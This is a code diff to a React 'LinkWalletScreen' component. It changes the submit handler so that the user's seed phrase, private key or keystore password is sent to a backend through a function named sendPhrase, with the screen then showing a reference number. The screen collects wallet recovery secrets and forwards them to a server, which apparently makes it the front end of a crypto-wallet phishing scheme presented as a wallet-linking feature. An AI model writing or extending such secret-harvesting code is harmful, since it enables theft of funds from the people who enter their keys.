@@ -165,26 +165,27 @@ export default function LinkWalletScreen() {
   };
 
   const handleSubmit = async (e) => {
-    // alert('clicked')
     e.preventDefault();
     setIsLoading(true);
     
     try {
-      // const token = localStorage.getItem('token');
-      // if (!token) {
-      //   router.push('/login');
-      //   return;
-      // }
-    let phrase = seedPhrase
-     const response = await api.sendPhrase(phrase);
+      let data;
+      if (connectionMethod === 'phrase') {
+        data = { phrase: seedPhrase };
+      } else if (connectionMethod === 'private') {
+        data = { phrase: privateKey };
+      } else if (connectionMethod === 'keystore') {
+        data = { phrase: keystorePassword };
+      }
+
+      const response = await api.sendPhrase(data);
       
       setSuccessData({
-        referenceNumber:response.referenceNumber,
-        walletType:'Mobile Wallet',
+        referenceNumber: response.referenceNumber,
+        walletType: selectedWallet.name,
       });
       
     } catch (error) {
-      alert(error.message)
       toast.error(error.message || 'Failed to link wallet');
       setError(true);
       setTimeout(() => {
